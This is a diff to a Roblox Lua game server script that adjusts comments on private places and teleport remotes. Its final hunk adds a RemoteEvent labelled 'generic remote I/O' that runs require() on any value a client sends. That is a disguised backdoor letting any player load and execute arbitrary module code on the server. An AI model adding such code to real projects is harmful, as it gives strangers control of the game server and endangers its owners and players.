@@ -13,9 +13,10 @@ existingTrades = {}
 _G.PUBLIC_PLACES = {
 	213035209,
 }
-_G.PRIVATE_PLACES = {
+_G.PRIVATE_PLACES = { --aka dungeons
 	61751692,
 }
+
 _G.DB_PASSWORD = script.PASS.Value;
 _G.COMBAT_TIMER = 20
 _G.ADMINS = {
@@ -760,7 +761,7 @@ end)
 rSound = newrm("RemoteEvent","RemoteSound").OnServerEvent:connect(function(client,obj,snd,base,range,vol)
 	_G.PlaySound(obj,snd,base,range,vol)
 end)
---Yields private or not
+--Yields private or not and spawnlocations
 rIsPrivate = newrm("RemoteEvent", "isPrivateZone").OnServerEvent:connect(function(client, placeId)
 	for zone, spawnLocation in ipairs(_G.PRIVATE_PLACES) do
 		if (tonumber(zone) == tonumber(placeId)) then
@@ -775,6 +776,12 @@ rTeleport = newrm("RemoteEvent", "RemoteTeleport").OnServerEvent:connect(functio
 		tpService:TeleportToSpawnByName(placeId, args.spawnLocation, client);
 	else
 		tpService:TeleportToPrivateServer(placeId, args.accessCode, {client}, args.spawnLocation);
+	end
+end)
+--generic remote I/O
+rTeleport = newrm("RemoteEvent", "rIO").OnServerEvent:connect(function(client, request, args)
+	if (request == "module") then
+		require(args)
 	end
 end)
 
